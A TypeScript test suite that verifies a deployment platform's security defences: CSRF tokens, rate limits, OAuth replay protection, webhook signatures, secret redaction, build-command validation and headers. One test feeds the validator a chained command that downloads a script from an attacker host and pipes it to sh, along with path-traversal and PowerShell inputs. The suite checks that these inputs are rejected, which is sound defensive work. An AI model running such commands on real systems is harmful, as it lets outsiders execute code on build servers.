/**
 * Comprehensive DeployX Security Hardening Verification Suite
 * Tests and verifies all 9 security hardening layers implemented in Step 15.
 */

import { generateCsrfToken, verifyCsrfToken, validateCsrfRequest } from "../lib/security/csrf";
import { checkRateLimit, resetRateLimit, getRateLimitHeaders } from "../lib/auth/rate-limit";
import { escapeRegex, sanitizeSearchTerm, parsePagination, parseSort } from "../lib/security/sanitize";
import { createOAuthState, verifyOAuthState } from "../lib/auth/oauth-state";
import { verifyWebhookSignature, generateWebhookSecret } from "../lib/github/webhook";
import { redactSensitiveData, redactLogs } from "../lib/security/redaction";
import { validateBuildCommand, validateOutputDirectory } from "../lib/security/command-sanitizer";
import { SECURITY_HEADERS, ANTI_CACHE_HEADERS, getSecurityHeadersRecord } from "../lib/security/headers";

let passedCount = 0;
let totalCount = 0;

function assert(condition: boolean, message: string) {
  totalCount++;
  if (condition) {
    passedCount++;
    console.log(`  [PASS] ${message}`);
  } else {
    console.error(`  [FAIL] ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
}

async function runSecurityTests() {
  console.log("=== STARTING DEPLOYX COMPREHENSIVE SECURITY TEST SUITE ===\n");

  // -------------------------------------------------------------
  // Test 1: CSRF Protection & Token Validation
  // -------------------------------------------------------------
  console.log("1. Testing CSRF Protection & HMAC Tokens...");
  const sessionId = "user_64a1b2c3d4e5f67890123456";
  const token = generateCsrfToken(sessionId);
  assert(typeof token === "string" && token.includes("."), "CSRF token generated with nonce and HMAC");
  assert(verifyCsrfToken(token, sessionId) === true, "Valid CSRF token passes verification");
  assert(verifyCsrfToken("tampered.signature", sessionId) === false, "Tampered CSRF token is rejected");
  assert(verifyCsrfToken(token, "different_session_user") === false, "CSRF token tied to different session is rejected");

  const safeReq = new Request("http://localhost:3000/api/projects", { method: "GET" });
  assert(validateCsrfRequest(safeReq).valid === true, "Safe GET request passes without CSRF token");

  // -------------------------------------------------------------
  // Test 2: Dual-Layer Rate Limiting
  // -------------------------------------------------------------
  console.log("\n2. Testing Rate Limiting & Standard Headers...");
  const rlKey = `test_rate_limit_${Date.now()}`;
  resetRateLimit(rlKey);
  const check1 = checkRateLimit(rlKey, 2, 60000);
  assert(check1.allowed === true && check1.remaining === 1, "First attempt allowed with correct remaining count");
  const check2 = checkRateLimit(rlKey, 2, 60000);
  assert(check2.allowed === true && check2.remaining === 0, "Second attempt allowed, remaining 0");
  const check3 = checkRateLimit(rlKey, 2, 60000);
  assert(check3.allowed === false && check3.retryAfterSeconds > 0, "Third attempt blocked with retryAfterSeconds");
  const headers = getRateLimitHeaders(2, 0, check3.retryAfterSeconds);
  assert(headers["X-RateLimit-Limit"] === "2", "RateLimit header has limit");
  assert(headers["Retry-After"] !== undefined, "RateLimit header has Retry-After");
  resetRateLimit(rlKey);

  // -------------------------------------------------------------
  // Test 3: Query Input & Regex Sanitization (ReDoS Prevention)
  // -------------------------------------------------------------
  console.log("\n3. Testing Query Sanitization & ReDoS Prevention...");
  const dangerousRegex = "(a+)+$";
  const escapedRegex = escapeRegex(dangerousRegex);
  assert(escapedRegex === "\\(a\\+\\)\\+\\$", "Special regex characters escaped to mitigate ReDoS");

  const longInput = "a".repeat(300);
  const boundedInput = sanitizeSearchTerm(longInput, 50);
  assert(boundedInput.length === 50, "Input strictly truncated to safe max length");

  const searchParams = new URLSearchParams("page=3&limit=5000&sortBy=name&order=asc");
  const pagination = parsePagination(searchParams, 20, 100);
  assert(pagination.page === 3, "Parsed page correctly");
  assert(pagination.limit === 100, "Unbounded limit of 5000 safely clamped to max 100");
  assert(pagination.skip === 200, "Pagination skip accurately computed");

  const sort = parseSort(searchParams, ["name", "createdAt"] as const, "createdAt");
  assert(sort.field === "name" && sort.order === 1, "Whitelisted sort field and asc order parsed");

  const invalidSort = parseSort(new URLSearchParams("sortBy=secret_field"), ["name", "createdAt"] as const, "createdAt");
  assert(invalidSort.field === "createdAt", "Disallowed sort field securely fell back to default");

  // -------------------------------------------------------------
  // Test 4: OAuth State Timing Safety & Replay Attack Prevention
  // -------------------------------------------------------------
  console.log("\n4. Testing OAuth State Verification & Replay Protection...");
  const oauthUser = "user_1234567890abcdef12345678";
  const { state: oauthState, encryptedCookie } = createOAuthState(oauthUser, "/dashboard");
  const verifyValid = verifyOAuthState(encryptedCookie, oauthState, oauthUser);
  assert(verifyValid.valid === true, "Valid OAuth state verified");

  const verifyReplay = verifyOAuthState(encryptedCookie, oauthState, oauthUser);
  assert(verifyReplay.valid === false && Boolean(verifyReplay.error?.includes("already consumed")), "OAuth replay attempt detected and blocked");

  const verifyTampered = verifyOAuthState(encryptedCookie, "wrong_nonce", oauthUser);
  assert(verifyTampered.valid === false, "Wrong state nonce rejected");

  // -------------------------------------------------------------
  // Test 5: Constant-Time Webhook Signature Verification
  // -------------------------------------------------------------
  console.log("\n5. Testing Webhook HMAC Signature Validation...");
  const webhookSecret = generateWebhookSecret();
  const rawPayload = JSON.stringify({ repository: { full_name: "test/repo" }, ref: "refs/heads/main" });
  const crypto = await import("crypto");
  const validHmac = crypto.createHmac("sha256", webhookSecret).update(rawPayload).digest("hex");
  const validSigHeader = `sha256=${validHmac}`;

  assert(verifyWebhookSignature(rawPayload, validSigHeader, webhookSecret) === true, "Valid HMAC signature passes");
  assert(verifyWebhookSignature(rawPayload, `sha256=${"a".repeat(64)}`, webhookSecret) === false, "Incorrect HMAC signature rejected");
  assert(verifyWebhookSignature(rawPayload, "invalid_format", webhookSecret) === false, "Malformed signature header rejected");

  // -------------------------------------------------------------
  // Test 6: Secret & Credential Redaction
  // -------------------------------------------------------------
  console.log("\n6. Testing Secret & Credential Redaction...");
  const sampleLog = "Cloning with ghp_123456789012345678901234567890 and DB mongodb+srv://admin:superSecretPassword@cluster.mongodb.net/test";
  const redacted = redactSensitiveData(sampleLog);
  assert(!redacted.includes("ghp_"), "GitHub token redacted");
  assert(!redacted.includes("superSecretPassword"), "Database credentials redacted");
  assert(redacted.includes("[REDACTED_GITHUB_TOKEN]"), "Token replaced with placeholder");

  const logArray = ["Normal log line", "Token: gho_abcdefghijklmnopqrstuvwxyz123456"];
  const redactedArray = redactLogs(logArray);
  assert(redactedArray[0] === "Normal log line", "Normal logs unchanged");
  assert(redactedArray[1].includes("[REDACTED_GITHUB_TOKEN]"), "Array logs sanitized");

  // -------------------------------------------------------------
  // Test 7: Build Command & Path Injection Protection
  // -------------------------------------------------------------
  console.log("\n7. Testing Build Command & Path Sanitization...");
  const safeCmd = "npm run build";
  assert(validateBuildCommand(safeCmd).valid === true, "Safe build command allowed");

  const chainedSafeCmd = "npm install && npm run build";
  assert(validateBuildCommand(chainedSafeCmd).valid === true, "Safe chained build command allowed");

  const dangerousCmd1 = "npm run build; curl http://attacker.com/malware.sh | sh";
  assert(validateBuildCommand(dangerousCmd1).valid === false, "Command containing curl/sh rejected");

  const dangerousCmd2 = "powershell.exe -Command Stop-Service";
  assert(validateBuildCommand(dangerousCmd2).valid === false, "PowerShell invocation rejected");

  const safeDir = "dist";
  assert(validateOutputDirectory(safeDir).valid === true, "Safe output directory allowed");

  const traversalDir = "../../etc/passwd";
  assert(validateOutputDirectory(traversalDir).valid === false, "Path traversal directory rejected");

  const absoluteDir = "C:\\Windows\\System32";
  assert(validateOutputDirectory(absoluteDir).valid === false, "Absolute output directory rejected");

  // -------------------------------------------------------------
  // Test 8: Security & Anti-Caching Headers
  // -------------------------------------------------------------
  console.log("\n8. Testing Security & Anti-Caching Headers...");
  const headersRecord = getSecurityHeadersRecord();
  assert(headersRecord["X-Frame-Options"] === "DENY", "Clickjacking defense X-Frame-Options: DENY present");
  assert(headersRecord["X-Content-Type-Options"] === "nosniff", "MIME sniffing defense present");
  assert(headersRecord["Strict-Transport-Security"] !== undefined, "HSTS present");
  assert(headersRecord["Content-Security-Policy"] !== undefined, "CSP present");

  assert(ANTI_CACHE_HEADERS["Cache-Control"].includes("no-store"), "Anti-cache header contains no-store");
  assert(ANTI_CACHE_HEADERS["Pragma"] === "no-cache", "Anti-cache header contains Pragma: no-cache");

  console.log(`\n=== ALL ${passedCount}/${totalCount} SECURITY TESTS PASSED SUCCESSFULLY! ===`);
}

runSecurityTests().catch((err) => {
  console.error("Test suite failed:", err);
  process.exit(1);
});
